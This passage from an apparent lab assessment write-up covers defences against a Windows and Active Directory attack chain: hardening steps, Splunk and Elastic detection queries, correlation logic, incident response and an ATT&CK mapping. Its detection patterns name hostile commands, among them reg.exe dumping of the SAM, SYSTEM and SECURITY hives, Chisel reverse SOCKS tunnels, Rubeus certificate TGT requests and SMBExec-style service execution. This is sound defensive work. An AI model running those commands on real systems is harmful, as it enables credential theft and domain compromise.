+<li>Apply URL allowlists, external-link interstitials and isolated browser sessions to automated link review.</li>
+<li>Prevent review workers from sending Windows integrated authentication to arbitrary hosts.</li></ul>
+
+<h3 id="3-remove-ntlmv1-and-forced-authentication-paths">12.3 Remove NTLMv1 and forced-authentication paths</h3>
+
+<ul><li>Configure Network security: LAN Manager authentication level to Send NTLMv2 responses only. Refuse LM &amp; NTLM after compatibility testing.</li>
+<li>Audit NTLM use, identify legacy dependencies and then restrict NTLM through domain policy.</li>
+<li>Block outbound TCP 139 and 445 and UDP 137 at workstation, server and perimeter firewalls except to approved internal file services.</li>
+<li>Disable the WebClient service where WebDAV is not required.</li>
+<li>Use SMB signing and Extended Protection for Authentication where supported.</li>
+<li>Prevent browsers and automation workers from automatically forwarding integrated credentials to untrusted zones.</li>
+<li>Alert on NTLM authentication to internet, VPN-client or non-server address space.</li></ul>
+
+<p>Microsoft documents the policy levels and their effects in <a href="https://learn.microsoft.com/windows/security/threat-protection/security-policy-settings/network-security-lan-manager-authentication-level" target="_blank" rel="noopener">Network security: LAN Manager authentication level</a>.</p>
+
+<h3 id="4-harden-workstations-and-local-administration">12.4 Harden workstations and local administration</h3>
+
+<ul><li>Remove ordinary domain identities from local Administrators.</li>
+<li>Use Windows LAPS for unique, rotated local Administrator passwords.</li>
+<li>Remove AutoAdminLogon and DefaultPassword values.</li>
+<li>Enable Credential Guard where supported.</li>
+<li>Disable Remote Registry unless explicitly required.</li>
+<li>Restrict remote service creation, ADMIN$ access and WMI to administrative management networks.</li>
+<li>Apply WDAC or AppLocker controls to block unapproved tools such as Chisel, Rubeus and unsigned binaries.</li>
+<li>Audit process creation with command lines and deploy Sysmon with tuned ProcessCreate, NetworkConnect, FileCreate, RegistryEvent and DNSQuery coverage.</li></ul>
+
+<h3 id="5-harden-ssh-and-the-edge-host">12.5 Harden SSH and the edge host</h3>
+
+<ul><li>Disable password authentication and require managed SSH keys or hardware-backed authentication.</li>
+<li>Restrict SSH with AllowGroups and a dedicated administrative group.</li>
+<li>Place SSH behind a management VPN or bastion rather than exposing it to every application user.</li>
+<li>Do not map broad Active Directory groups into Linux login rights.</li>
+<li>Require MFA for privileged remote access.</li>
+<li>Prevent the DMZ host from initiating arbitrary connections to domain controllers and workstations.</li>
+<li>Separate web workloads, ingestion workers and administrative access onto different identities and security boundaries.</li></ul>
+
+<h3 id="6-remediate-ad-cs-esc13">12.6 Remediate AD CS ESC13</h3>
+
+<ul><li>Inventory issuance-policy OIDs and every msDS-OIDToGroupLink value.</li>
+<li>Remove the GroupPolicy_Audit OID-to-GPO-Auditors link unless it has an exceptional, documented business requirement.</li>
+<li>Treat any linked group as a privileged group and apply Tier 0 controls if it can affect domain policy.</li>
+<li>Restrict template enrolment to a small, dedicated group.</li>
+<li>Remove broad Enrol rights and avoid combining low-privilege enrolment with privileged issuance policies.</li>
+<li>Require certificate manager approval or authorised signatures for genuinely privileged templates.</li>
+<li>Use short certificate validity periods and revoke certificates issued through the vulnerable configuration.</li>
+<li>Audit template, CA, OID and group-link changes.</li>
+<li>Forward AD CS Security events 4886, 4887 and 4888 to the SIEM.</li>
+<li>Monitor Kerberos event 4768 for PKINIT certificate details and unusual certificate-based TGT requests.</li></ul>
+
+<p>Microsoft recommends focused AD CS monitoring including events 4886 and 4887 in <a href="https://learn.microsoft.com/windows-server/identity/ad-cs/secure-delegate-audit-certification-authority" target="_blank" rel="noopener">Secure, delegate and audit AD CS administration</a>.</p>
+
+<h3 id="7-restrict-machine-accounts-dns-and-spns">12.7 Restrict machine accounts, DNS and SPNs</h3>
+
+<ul><li>Set ms-DS-MachineAccountQuota to zero unless users genuinely need self-service domain join.</li>
+<li>Use a controlled provisioning service for workstation and server joins.</li>
+<li>Alert on Security event 4741 when the creator is not an approved provisioning identity.</li>
+<li>Monitor changes to servicePrincipalName and dNSHostName with Directory Service Change auditing and appropriate SACLs.</li>
+<li>Limit who can create AD-integrated DNS records.</li>
+<li>Detect new computer objects followed rapidly by SPN, DNS and service-ticket activity.</li></ul>
+
+<h3 id="8-protect-group-policy-and-tier-0">12.8 Protect Group Policy and Tier 0</h3>
+
+<ul><li>Remove unnecessary WriteGPLink, WriteDACL and GenericWrite delegations from sensitive OUs.</li>
+<li>Manage GPOs from privileged access workstations using separate Tier 0 identities.</li>
+<li>Apply change control and peer review to GPO creation, link changes and preference files.</li>
+<li>Enable Audit Directory Service Changes and configure SACLs so event 5136 records gPLink modifications.</li>
+<li>Monitor SYSVOL and Group Policy Preference XML changes.</li>
+<li>Permit LDAP, LDAPS, SMB and Kerberos service traffic only to approved domain controllers and management servers.</li>
+<li>Alert when a domain controller or managed endpoint connects to TCP 389 or 445 on a non-DC address.</li>
+<li>Restrict RDP access to domain controllers to approved administrative groups and PAWs.</li>
+<li>Monitor RDP logons followed by gpupdate, GPO changes, scheduled-task creation or local-group modification.</li></ul>
+
+<h2 id="telemetry-prerequisites">13. Telemetry Prerequisites</h2>
+
+<p>The detections below assume the following data is collected. Queries must be adapted to local index, sourcetype and field conventions.</p>
+
+<div class="table-scroll"><table><thead><tr><th scope="col">Data source</th><th scope="col">Required coverage</th></tr></thead><tbody><tr><td>Windows Security</td><td>4624, 4688, 4697, 4698, 4702, 4732, 4741, 4742, 4768, 4886, 4887, 4888, 5136 and 5145</td></tr>
+<tr><td>AD CS Security</td><td>Certificate request, issue and denial events from the CA</td></tr>
+<tr><td>Microsoft-Windows-NTLM/Operational</td><td>NTLM client and server auditing, including legacy use</td></tr>
+<tr><td>Sysmon</td><td>Event 1 process, 3 network, 11 file, 12-14 registry and 22 DNS</td></tr>
+<tr><td>PowerShell</td><td>Script-block and module logging where PowerShell is in scope</td></tr>
+<tr><td>EDR</td><td>Process trees, command lines, hashes, registry and network connections</td></tr>
+<tr><td>Network</td><td>DNS, firewall, proxy, NetFlow and east-west SMB/LDAP visibility</td></tr>
+<tr><td>Linux</td><td>auditd or EDR process, file and network telemetry on the edge host</td></tr>
+<tr><td>Rocket.Chat</td><td>Authentication, integration, message and token-administration audit logs</td></tr>
+<tr><td>GeoNetwork/ingestion</td><td>Upload, format detection, converter command, job owner and result logs</td></tr></tbody></table></div>
+
+<p>Microsoft's <a href="https://learn.microsoft.com/windows-server/identity/ad-ds/plan/security-best-practices/advanced-audit-policy-configuration" target="_blank" rel="noopener">advanced audit policy guidance</a> covers scheduled-task events, while <a href="https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon" target="_blank" rel="noopener">Sysmon documentation</a> describes the endpoint event types used below. Event 5136 requires Directory Service Change auditing and a suitable SACL on the modified object or attribute.</p>
+
+<h2 id="splunk-detections">14. Splunk Detections</h2>
+
+<p>These searches use common Splunk field names. In production, map them to the Splunk Add-on for Microsoft Windows or the Endpoint data model, validate field extraction and add allowlists for approved administrative activity.</p>
+
+<h3 id="1-successful-ntlmv1-network-logon">14.1 Successful NTLMv1 network logon</h3>
+
+<pre data-lang="spl"><code>index=windows sourcetype=&quot;XmlWinEventLog:Security&quot; EventCode=4624
+| eval logon_type=coalesce(Logon_Type, LogonType)
+| eval auth_package=coalesce(Authentication_Package, AuthenticationPackageName)
+| eval ntlm_version=coalesce(LmPackageName, Package_Name__NTLM_only_, PackageName)
+| where logon_type=3 AND auth_package=&quot;NTLM&quot;
+    AND match(ntlm_version, &quot;(?i)NTLM V1&quot;)
+| stats count min(_time) as firstTime max(_time) as lastTime
+    values(IpAddress) as src_ip values(WorkstationName) as workstation
+    by host TargetDomainName TargetUserName ntlm_version
+| convert ctime(firstTime) ctime(lastTime)</code></pre>
+
+<p>Severity should be high because NTLMv1 should not appear in a modern domain. Also ingest Microsoft-Windows-NTLM/Operational and alert on legacy protocol use even when the logon fails.</p>
+
+<h3 id="2-outbound-smb-forced-authentication-to-an-unapproved-destination">14.2 Outbound SMB forced authentication to an unapproved destination</h3>
+
+<pre data-lang="spl"><code>index=windows sourcetype=&quot;XmlWinEventLog:Microsoft-Windows-Sysmon/Operational&quot;
+  EventCode=3 (DestinationPort=139 OR DestinationPort=445)
+| where NOT (
+    cidrmatch(&quot;10.0.0.0/8&quot;, DestinationIp)
+    OR cidrmatch(&quot;172.16.0.0/12&quot;, DestinationIp)
+    OR cidrmatch(&quot;192.168.0.0/16&quot;, DestinationIp)
+  )
+| stats count values(Image) as process values(User) as user
+    min(_time) as firstTime max(_time) as lastTime
+    by Computer DestinationIp DestinationPort
+| convert ctime(firstTime) ctime(lastTime)</code></pre>
+
+<p>For organisations with public or partner SMB services, replace the private-address check with an approved-destination lookup.</p>
+
+<h3 id="3-ntlm-downgrade-registry-modification">14.3 NTLM downgrade registry modification</h3>
+
+<pre data-lang="spl"><code>index=windows sourcetype=&quot;XmlWinEventLog:Microsoft-Windows-Sysmon/Operational&quot;
+  EventCode=13 TargetObject=&quot;*\\Control\\Lsa\\LmCompatibilityLevel&quot;
+| where match(Details, &quot;(?i)(DWORD \\(0x0000000[0-2]\\)|^0$|^1$|^2$)&quot;)
+| table _time Computer User Image TargetObject Details</code></pre>
+
+<p>The Elastic prebuilt detection for an <a href="https://www.elastic.co/docs/reference/security/prebuilt-rules/rules/windows/defense_evasion_ntlm_downgrade" target="_blank" rel="noopener">NTLMv1 downgrade</a> provides a useful cross-platform reference.</p>
+
+<h3 id="4-registry-hive-dumping">14.4 Registry hive dumping</h3>
+
+<pre data-lang="spl"><code>| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime
+    values(Processes.process) as process
+  from datamodel=Endpoint.Processes
+  where Processes.process_name=reg.exe
+    (Processes.process=&quot;* save HKLM\\SAM *&quot;
+     OR Processes.process=&quot;* save HKLM\\SYSTEM *&quot;
+     OR Processes.process=&quot;* save HKLM\\SECURITY *&quot;)
+  by Processes.dest Processes.user Processes.parent_process_name
+| rename Processes.* as *
+| convert ctime(firstTime) ctime(lastTime)</code></pre>
+
+<p>Also detect file creation of SAM.hive, SYSTEM.hive and SECURITY.hive outside approved backup paths.</p>
+
+<h3 id="5-chisel-reverse-socks-activity">14.5 Chisel reverse SOCKS activity</h3>
+
+<pre data-lang="spl"><code>| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime
+    values(Processes.process) as process
+  from datamodel=Endpoint.Processes
+  where (Processes.process_name=chisel OR Processes.process_name=chisel.exe)
+    Processes.process=&quot;* client *&quot;
+    (Processes.process=&quot;*R:*socks*&quot; OR Processes.process=&quot;*reverse*&quot; OR Processes.process=&quot;*socks*&quot;)
+  by Processes.dest Processes.user Processes.parent_process_name
+| rename Processes.* as *
+| convert ctime(firstTime) ctime(lastTime)</code></pre>
+
+<p>Pair this with network detections for long-lived outbound connections from a server process to an internet or VPN-client address.</p>
+
+<h3 id="6-new-machine-account-created-by-an-unusual-principal">14.6 New machine account created by an unusual principal</h3>
+
+<pre data-lang="spl"><code>index=windows sourcetype=&quot;XmlWinEventLog:Security&quot; EventCode=4741
+| eval creator=SubjectDomainName.&quot;\\&quot;.SubjectUserName
+| where NOT match(creator, &quot;(?i)^(AIRWAYS\\\\(Join-Service|SCCM-Join|DC[0-9]+\\$)|NT AUTHORITY\\\\SYSTEM)$&quot;)
+| table _time host creator TargetDomainName TargetUserName
+    SamAccountName DnsHostName</code></pre>
+
+<p>Replace the example allowlist with approved domain-join identities. Correlate the event with 4742 changes and subsequent servicePrincipalName or dNSHostName modification.</p>
+
+<h3 id="7-sensitive-active-directory-attribute-modification">14.7 Sensitive Active Directory attribute modification</h3>
+
+<pre data-lang="spl"><code>index=windows sourcetype=&quot;XmlWinEventLog:Security&quot; EventCode=5136
+  AttributeLDAPDisplayName IN
+    (&quot;gPLink&quot;,&quot;servicePrincipalName&quot;,&quot;dNSHostName&quot;,&quot;msDS-OIDToGroupLink&quot;)
+| eval actor=SubjectDomainName.&quot;\\&quot;.SubjectUserName
+| stats values(OperationType) as operation values(AttributeValue) as value
+    min(_time) as firstTime max(_time) as lastTime
+    by host actor ObjectDN ObjectClass AttributeLDAPDisplayName CorrelationID
+| convert ctime(firstTime) ctime(lastTime)</code></pre>
+
+<p>Event 5136 commonly records deletion and addition as separate events. CorrelationID and a short time window should be used to reconstruct the complete change.</p>
+
+<h3 id="8-rare-or-privileged-ad-cs-certificate-issuance">14.8 Rare or privileged AD CS certificate issuance</h3>
+
+<pre data-lang="spl"><code>index=windows sourcetype=&quot;XmlWinEventLog:Security&quot; EventCode IN (4886,4887,4888)
+| eval requester=coalesce(Requester, SubjectUserName)
+| eval template=coalesce(CertificateTemplate, CertificateTemplateName, Attributes)
+| where EventCode=4887 AND (
+    match(template, &quot;(?i)GroupPolicy_Audit&quot;)
+    OR NOT match(template, &quot;(?i)^(User|Computer|WebServer|DomainController)$&quot;)
+  )
+| table _time host EventCode requester template RequestId Subject SerialNumber</code></pre>
+
+<p>The generic production version should use a lookup of approved templates and expected requester groups rather than relying only on the lab template name.</p>
+
+<h3 id="9-certificate-based-kerberos-tgt-request">14.9 Certificate-based Kerberos TGT request</h3>
+
+<pre data-lang="spl"><code>index=windows sourcetype=&quot;XmlWinEventLog:Security&quot; EventCode=4768
+| eval cert_thumbprint=coalesce(CertThumbprint, CertificateThumbprint)
+| eval cert_issuer=coalesce(CertIssuerName, CertificateIssuerName)
+| where isnotnull(cert_thumbprint) AND cert_thumbprint!=&quot;-&quot;
+| stats count values(IpAddress) as src_ip values(cert_issuer) as issuer
+    values(CertSerialNumber) as serial
+    by host TargetDomainName TargetUserName cert_thumbprint PreAuthType</code></pre>
+
+<p>Baseline legitimate smart-card and Windows Hello for Business activity. Alert when an identity that does not normally use certificate authentication requests a TGT shortly after a rare template issuance.</p>
+
+<h3 id="10-gpo-scheduled-task-file-access">14.10 GPO scheduled-task file access</h3>
+
+<pre data-lang="spl"><code>index=windows sourcetype=&quot;XmlWinEventLog:Security&quot; EventCode=5145
+  ShareName=&quot;*\\SYSVOL&quot;
+  RelativeTargetName=&quot;*\\Policies\\*\\Preferences\\ScheduledTasks\\ScheduledTasks.xml&quot;
+| stats count min(_time) as firstTime max(_time) as lastTime
+    values(IpAddress) as src_ip values(AccessList) as access
+    by host SubjectDomainName SubjectUserName ShareName RelativeTargetName
+| convert ctime(firstTime) ctime(lastTime)</code></pre>
+
+<p>This follows Splunk's published <a href="https://research.splunk.com/endpoint/350032cd-3d3f-4278-afc8-e01cf5c33524/" target="_blank" rel="noopener">Scheduled Task Created in Windows Task Scheduler by GPO</a> analytic. In this attack the policy source was not a legitimate SYSVOL host, so the next network detection is essential.</p>
+
+<h3 id="11-ldap-or-smb-from-a-managed-host-to-a-non-dc-server">14.11 LDAP or SMB from a managed host to a non-DC server</h3>
+
+<p>Maintain an approved_domain_services.csv lookup containing dest_ip values for domain controllers and authorised policy servers:</p>
+
+<pre data-lang="spl"><code>index=windows sourcetype=&quot;XmlWinEventLog:Microsoft-Windows-Sysmon/Operational&quot;
+  EventCode=3 DestinationPort IN (389,445,636,3268,3269)
+| lookup approved_domain_services.csv dest_ip AS DestinationIp OUTPUT dest_ip AS approved
+| where isnull(approved)
+| stats count values(Image) as process values(User) as user
+    min(_time) as firstTime max(_time) as lastTime
+    by Computer DestinationIp DestinationHostname DestinationPort
+| convert ctime(firstTime) ctime(lastTime)</code></pre>
+
+<p>This is one of the highest-value detections for the final stage because a domain controller retrieving policy from a VPN-client or workstation address should be exceptional.</p>
+
+<h3 id="12-addition-to-the-local-administrators-group">14.12 Addition to the local Administrators group</h3>
+
+<pre data-lang="spl"><code>index=windows sourcetype=&quot;XmlWinEventLog:Security&quot; EventCode=4732
+  TargetUserName=&quot;Administrators&quot;
+| eval actor=SubjectDomainName.&quot;\\&quot;.SubjectUserName
+| eval member=coalesce(MemberName, MemberSid)
+| table _time host actor member TargetDomainName TargetUserName</code></pre>
+
+<p>On a domain controller, any unexpected 4732 addition to Administrators should be treated as high severity.</p>
+
+<h3 id="13-rdp-forced-group-policy-refresh-and-privilege-change-correlation">14.13 RDP, forced Group Policy refresh and privilege change correlation</h3>
+
+<pre data-lang="spl"><code>index=windows sourcetype=&quot;XmlWinEventLog:Security&quot;
+  (EventCode=4624 Logon_Type=10)
+  OR (EventCode=4688 NewProcessName=&quot;*\\gpupdate.exe&quot;)
+  OR (EventCode=4732 TargetUserName=&quot;Administrators&quot;)
+| transaction host maxspan=15m startswith=(EventCode=4624) endswith=(EventCode=4732)
+| search eventcount&gt;=3
+| table _time host duration TargetUserName IpAddress NewProcessName
+    MemberName SubjectUserName</code></pre>
+
+<p>For large environments, implement this as a correlation search or risk-based analytic rather than using transaction over a broad index.</p>
+
+<h3 id="14-smbexec-style-transient-service-execution">14.14 SMBExec-style transient service execution</h3>
+
+<pre data-lang="spl"><code>index=windows
+  ((sourcetype=&quot;XmlWinEventLog:Security&quot; EventCode=4697)
+   OR (sourcetype=&quot;XmlWinEventLog:System&quot; EventCode=7045))
+| eval service_cmd=coalesce(ServiceFileName, ImagePath)
+| where match(service_cmd, &quot;(?i)(cmd\\.exe.*\\/Q.*\\/c|%COMSPEC%|\\\\ADMIN\\$|\\\\C\\$)&quot;)
+| table _time host SubjectUserName ServiceName service_cmd StartType</code></pre>
+
+<h2 id="elastic-security-detections">15. Elastic Security Detections</h2>
+
+<p>The following examples assume Elastic Common Schema and Winlogbeat or Elastic Agent. Field names should be validated against the deployed integration before rules are enabled.</p>
+
+<h3 id="1-netntlmv1-authentication">15.1 NetNTLMv1 authentication</h3>
+
+<p>KQL:</p>
+
+<pre data-lang="kql"><code>host.os.type:&quot;windows&quot; and event.code:&quot;4624&quot; and
+winlog.event_data.LogonType:&quot;3&quot; and
+winlog.event_data.AuthenticationPackageName:&quot;NTLM&quot; and
+(
+  winlog.event_data.LmPackageName:&quot;NTLM V1&quot; or
+  winlog.event_data.PackageName:&quot;NTLM V1&quot;
+)</code></pre>
+
+<h3 id="2-ntlm-downgrade">15.2 NTLM downgrade</h3>
+
+<p>Elastic's official prebuilt rule uses registry telemetry:</p>
+
+<pre data-lang="eql"><code>registry where host.os.type == &quot;windows&quot; and event.action != &quot;deletion&quot; and
+  registry.value == &quot;LmCompatibilityLevel&quot; and
+  registry.data.strings in
+    (&quot;2&quot;, &quot;1&quot;, &quot;0&quot;, &quot;0x00000002&quot;, &quot;0x00000001&quot;, &quot;0x00000000&quot;)</code></pre>
+
+<p>Reference: <a href="https://www.elastic.co/docs/reference/security/prebuilt-rules/rules/windows/defense_evasion_ntlm_downgrade" target="_blank" rel="noopener">Potential Credential Access via NTLMv1 Protocol</a>.</p>
+
+<h3 id="3-registry-hive-dumping">15.3 Registry hive dumping</h3>
+
+<p>EQL:</p>
+
+<pre data-lang="eql"><code>process where host.os.type == &quot;windows&quot; and
+  process.name : &quot;reg.exe&quot; and process.args : &quot;save&quot; and
+  process.command_line :
+    (&quot;*HKLM\\SAM*&quot;, &quot;*HKLM\\SYSTEM*&quot;, &quot;*HKLM\\SECURITY*&quot;)</code></pre>
+
+<p>Elastic also provides a prebuilt <a href="https://www.elastic.co/docs/reference/security/prebuilt-rules/rules/windows/credential_access_dump_registry_hives" target="_blank" rel="noopener">Windows Registry File Creation via Reg.exe</a> rule.</p>
+
+<h3 id="4-chisel-client-activity">15.4 Chisel client activity</h3>
+
+<p>EQL:</p>
+
+<pre data-lang="eql"><code>process where host.os.type == &quot;linux&quot; and
+  process.name : &quot;chisel&quot; and
+  process.args : &quot;client&quot; and
+  process.command_line : (&quot;*R:*socks*&quot;, &quot;*--reverse*&quot;, &quot;*socks*&quot;)</code></pre>
+
+<p>Reference: Elastic's <a href="https://www.elastic.co/docs/reference/security/prebuilt-rules/rules/linux/command_and_control_linux_chisel_client_activity" target="_blank" rel="noopener">Chisel client activity</a> rule.</p>
+
+<h3 id="5-new-machine-account">15.5 New machine account</h3>
+
+<p>KQL:</p>
+
+<pre data-lang="kql"><code>host.os.type:&quot;windows&quot; and event.code:&quot;4741&quot; and
+winlog.event_data.TargetUserName:* and
+not winlog.event_data.SubjectUserName:
+  (&quot;Join-Service&quot; or &quot;DC01$&quot;)</code></pre>
+
+<p>Replace the example exclusions with approved join services and domain-controller identities.</p>
+
+<h3 id="6-sensitive-directory-object-modification">15.6 Sensitive directory-object modification</h3>
+
+<p>KQL:</p>
+
+<pre data-lang="kql"><code>host.os.type:&quot;windows&quot; and event.code:&quot;5136&quot; and
+winlog.event_data.AttributeLDAPDisplayName:
+  (&quot;gPLink&quot; or &quot;servicePrincipalName&quot; or &quot;dNSHostName&quot; or &quot;msDS-OIDToGroupLink&quot;)</code></pre>
+
+<p>Create separate production rules for gPLink and msDS-OIDToGroupLink because both changes are sufficiently rare and sensitive to justify high-severity treatment.</p>
+
+<h3 id="7-rare-certificate-issuance">15.7 Rare certificate issuance</h3>
+
+<p>KQL:</p>
+
+<pre data-lang="kql"><code>host.os.type:&quot;windows&quot; and event.code:&quot;4887&quot; and
+(
+  winlog.event_data.Attributes:*GroupPolicy_Audit* or
+  winlog.event_data.CertificateTemplateName:&quot;GroupPolicy_Audit&quot;
+)</code></pre>
+
+<p>The scalable version should enrich the event with an approved-template and approved-requester lookup, then alert on mismatches.</p>
+
+<h3 id="8-pkinit-certificate-authentication">15.8 PKINIT certificate authentication</h3>
+
+<p>KQL:</p>
+
+<pre data-lang="kql"><code>host.os.type:&quot;windows&quot; and event.code:&quot;4768&quot; and
+winlog.event_data.CertThumbprint:* and
+not winlog.event_data.CertThumbprint:&quot;-&quot; and
+winlog.event_data.PreAuthType:(&quot;15&quot; or &quot;16&quot; or &quot;17&quot;)</code></pre>
+
+<p>Microsoft documents the certificate issuer, serial number and thumbprint fields in <a href="https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4768" target="_blank" rel="noopener">event 4768</a>.</p>
+
+<h3 id="9-gpo-scheduled-task-xml">15.9 GPO scheduled-task XML</h3>
+
+<p>EQL:</p>
+
+<pre data-lang="eql"><code>file where host.os.type == &quot;windows&quot; and
+  file.path : &quot;*\\SYSVOL\\*\\Policies\\*\\Preferences\\ScheduledTasks\\ScheduledTasks.xml&quot; and
+  not process.executable : &quot;C:\\Windows\\System32\\dfsrs.exe&quot;</code></pre>
+
+<p>Elastic provides two relevant prebuilt rules:</p>
+
+<ul><li><a href="https://www.elastic.co/docs/reference/security/prebuilt-rules/rules/windows/privilege_escalation_group_policy_scheduled_task" target="_blank" rel="noopener">Scheduled Task Created via Group Policy Object</a></li>
+<li><a href="https://www.elastic.co/docs/reference/security/prebuilt-rules/rules/windows/privilege_escalation_gpo_schtask_service_creation" target="_blank" rel="noopener">Group Policy Scheduled Task or Service Creation</a></li></ul>
+
+<h3 id="10-ldap-or-smb-to-an-unapproved-policy-server">15.10 LDAP or SMB to an unapproved policy server</h3>
+
+<p>KQL:</p>
+
+<pre data-lang="kql"><code>host.os.type:&quot;windows&quot; and event.category:&quot;network&quot; and
+destination.port:(389 or 445 or 636 or 3268 or 3269) and
+not destination.ip:
+  (&quot;192.168.100.1&quot; or &quot;&lt;OTHER_APPROVED_DC_IP&gt;&quot;)</code></pre>
+
+<p>Scope the rule to domain controllers and managed domain members, and populate the exclusion from an asset inventory rather than maintaining addresses directly in the query.</p>
+
+<h3 id="11-rubeus-certificate-tgt-request">15.11 Rubeus certificate TGT request</h3>
+
+<p>EQL:</p>
+
+<pre data-lang="eql"><code>process where host.os.type == &quot;windows&quot; and
+  process.name : &quot;Rubeus.exe&quot; and
+  process.command_line : &quot;*asktgt*&quot; and
+  process.command_line : &quot;*/certificate:*&quot;</code></pre>
+
+<p>Do not rely on the filename alone. Add hash, signer, behaviour and 4768 PKINIT correlation because an attacker can rename the binary.</p>
+
+<h3 id="12-forced-group-policy-refresh">15.12 Forced Group Policy refresh</h3>
+
+<p>EQL:</p>
+
+<pre data-lang="eql"><code>process where host.os.type == &quot;windows&quot; and
+  process.name : &quot;gpupdate.exe&quot; and
+  process.args : &quot;/force&quot;</code></pre>
+
+<p>This is low severity by itself. Raise the risk when it occurs on a domain controller after an RDP logon, gPLink modification or connection to a non-DC LDAP/SMB destination.</p>
+
+<h3 id="13-local-administrators-group-addition">15.13 Local Administrators group addition</h3>
+
+<p>KQL:</p>
+
+<pre data-lang="kql"><code>host.os.type:&quot;windows&quot; and event.code:&quot;4732&quot; and
+winlog.event_data.TargetUserName:&quot;Administrators&quot;</code></pre>
+
+<h3 id="14-smbexec-or-transient-service-execution">15.14 SMBExec or transient service execution</h3>
+
+<p>EQL:</p>
+
+<pre data-lang="eql"><code>any where host.os.type == &quot;windows&quot; and
+  event.code in (&quot;4697&quot;, &quot;7045&quot;) and
+  (
+    winlog.event_data.ServiceFileName :
+      (&quot;*cmd.exe*&quot;, &quot;*COMSPEC*&quot;, &quot;*ADMIN$*&quot;, &quot;*C$*&quot;) or
+    winlog.event_data.ImagePath :
+      (&quot;*cmd.exe*&quot;, &quot;*COMSPEC*&quot;, &quot;*ADMIN$*&quot;, &quot;*C$*&quot;)
+  )</code></pre>
+
+<h2 id="high-confidence-correlation-strategy">16. High-Confidence Correlation Strategy</h2>
+
+<p>Individual alerts will produce noise in a mature environment. The following sequence should be treated as a high-confidence attack story:</p>
+
+<ol><li>VRT upload contains VRTRawRasterBand, PixelFunctionLanguage or PixelFunctionCode.</li>
+<li>The ingestion worker reads an environment file or starts a shell/interpreter.</li>
+<li>A Rocket.Chat integration sends a link to an IT user.</li>
+<li>The user workstation connects to an unapproved SMB, WebDAV or HTTP destination and uses NTLM.</li>
+<li>NTLMv1 appears in event 4624 or NTLM Operational telemetry.</li>
+<li>reg.exe saves SAM, SYSTEM or SECURITY.</li>
+<li>A server runs Chisel or establishes a long-lived reverse tunnel.</li>
+<li>Event 4741 creates a machine account outside the provisioning workflow.</li>
+<li>Event 4887 issues a certificate from a rare template.</li>
+<li>Event 4768 records certificate-based TGT authentication for an unusual user.</li>
+<li>Event 5136 changes gPLink, an SPN, dNSHostName or msDS-OIDToGroupLink.</li>
+<li>A domain controller connects to LDAP or SMB on a non-DC host.</li>
+<li>gpupdate /force runs after an RDP logon.</li>
+<li>Event 4732 adds a domain user to local Administrators.</li>
+<li>Event 4697 or 7045 shows transient remote service execution.</li></ol>
+
+<p>A risk-based alert should accumulate entity risk on the user, source host, destination host, certificate template and modified OU. A single path spanning five or more of these behaviours should trigger incident response even when each individual analytic is below its alert threshold.</p>
+
+<h2 id="incident-response-actions-for-this-exact-chain">17. Incident-Response Actions for This Exact Chain</h2>
+
+<p>If this activity occurred in a real environment:</p>
+
+<ol><li>Isolate the geospatial worker, Linux gateway, affected workstation and domain controller while preserving memory and logs.</li>
+<li>Disable or revoke the exposed Rocket.Chat integration and rotate every secret readable by the ingestion identity.</li>
+<li>Disable the compromised user accounts and invalidate active sessions.</li>
+<li>Block attacker IPs and outbound SMB/WebDAV.</li>
+<li>Revoke the issued certificate and publish updated CRLs.</li>
+<li>Remove the vulnerable template from issuance until its enrolment and issuance-policy configuration is corrected.</li>
+<li>Inspect all msDS-OIDToGroupLink values and privileged issuance policies.</li>
+<li>Remove rogue computer, DNS and SPN objects.</li>
+<li>Restore the affected OU's gPLink from a known-good value and review every linked GPO.</li>
+<li>Inspect SYSVOL, Group Policy Preferences, scheduled tasks, services and local group membership on all systems in the OU.</li>
+<li>Rotate local administrator credentials through LAPS and reset affected domain credentials.</li>
+<li>Review CA events 4886-4888 and Kerberos 4768 activity for additional certificate abuse.</li>
+<li>Review events 4741/4742 and directory changes for other attacker-created machine accounts.</li>
+<li>Hunt for Chisel, Rubeus, registry hive exports, ADMIN$ execution and unauthorised RDP.</li>
+<li>Rebuild systems where credential-theft or Tier 0 compromise cannot be confidently scoped.</li></ol>
+
+<h2 id="mitre-att-ck-mapping">18. MITRE ATT&amp;CK Mapping</h2>
+
+<div class="table-scroll"><table><thead><tr><th scope="col">Technique</th><th scope="col">ID</th><th scope="col">Use in this assessment</th></tr></thead><tbody><tr><td>Active Scanning</td><td>T1595</td><td>Public port and service enumeration</td></tr>
+<tr><td>Exploit Public-Facing Application</td><td>T1190</td><td>Malicious VRT processed by GeoNetwork pipeline</td></tr>
+<tr><td>Command and Scripting Interpreter</td><td>T1059</td><td>Python, shell and command execution</td></tr>
+<tr><td>Forced Authentication</td><td>T1187</td><td>Victim workflow sent NTLM material to attacker infrastructure</td></tr>
+<tr><td>Brute Force: Password Cracking</td><td>T1110.002</td><td>Offline recovery of NetNTLMv1-derived credential material</td></tr>
+<tr><td>Pass the Hash</td><td>T1550.002</td><td>Owen's NT hash used against WKSTN01</td></tr>
+<tr><td>OS Credential Dumping: Security Account Manager</td><td>T1003.002</td><td>SAM, SYSTEM and SECURITY hive extraction</td></tr>
+<tr><td>Remote Services: SSH</td><td>T1021.004</td><td>Domain password used to access the Linux gateway</td></tr>
+<tr><td>Protocol Tunnelling</td><td>T1572</td><td>Chisel reverse SOCKS pivot</td></tr>
+<tr><td>Remote System Discovery</td><td>T1018</td><td>Internal host and service discovery</td></tr>
+<tr><td>Account Discovery: Domain Account</td><td>T1087.002</td><td>LDAP and BloodHound domain enumeration</td></tr>
+<tr><td>Permission Groups Discovery: Domain Groups</td><td>T1069.002</td><td>GPO-Auditors and delegated rights discovered</td></tr>
+<tr><td>Steal or Forge Authentication Certificates</td><td>T1649</td><td>ESC13 certificate used for PKINIT</td></tr>
+<tr><td>Create Account: Domain Account</td><td>T1136.002</td><td>REDGPO2$ machine account created</td></tr>
+<tr><td>Account Manipulation</td><td>T1098</td><td>SPN, DNS and local-group state modified</td></tr>
+<tr><td>Remote Services: RDP</td><td>T1021.001</td><td>Isabel session used to trigger user policy</td></tr>
+<tr><td>Group Policy Modification</td><td>T1484.001</td><td>Malicious GPO linked to IT OU</td></tr>
+<tr><td>Scheduled Task/Job: Scheduled Task</td><td>T1053.005</td><td>Group Policy Preference scheduled task</td></tr>
